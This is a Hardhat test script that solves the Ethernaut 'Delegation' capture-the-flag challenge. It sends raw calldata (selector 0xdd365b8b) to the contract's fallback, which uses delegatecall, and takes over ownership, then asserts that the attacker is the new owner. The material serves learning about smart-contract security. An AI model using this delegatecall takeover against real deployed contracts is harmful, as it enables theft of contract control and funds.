const { Provider } = require("@ethersproject/abstract-provider");
const { expect } = require("chai");
const { providers } = require("ethers");
const { AbiCoder, keccak256 } = require("ethers/lib/utils");
const { ethers } = require("hardhat");

describe("Delegation Exploit using EOA", function () {
  let delegateContract, delegationContract, attacker, contractAddress, newOwner;

  before("Setup for attack", async function () {
    [attacker] = await ethers.getSigners();
    contractAddress = "0xc54662406A70E7707C1469446e924cc0e0e46894"; // insert contract address of ethernaut challenge
    delegationContract = await ethers.getContractAt(
      "Delegation",
      contractAddress
    );

    // delegateContract = await ethers.getContractAt("Delegate", contractAddress);

    console.log(`Delegation contract connected ${delegationContract}`);
  });

  it("perform exploit", async function () {
    // Attack flow
    // 1) See the original owner of the delegation contract

    let originalOwner = await delegationContract.owner();

    console.log(`The original owner is ${originalOwner}`);
    // 2) Call the fallback funciton of delegation contract (exploit happens here)
    let txFallbackCall = await attacker.sendTransaction({
      to: contractAddress,
      data: "0xdd365b8b", //Learn web3 js for abi encoded data and function signatures
      gasLimit: 2200000,
    });

    let receiptTxTransfer = await txFallbackCall.wait();

    // 3) Grab the new owner of the delegation contract

    newOwner = await delegationContract.owner();
  });

  after("confirm exploit", async function () {
    // 4) Lets confirm that we have gained ownership of the delegation contract
    expect(newOwner).to.be.eq(attacker.address);
  });
});
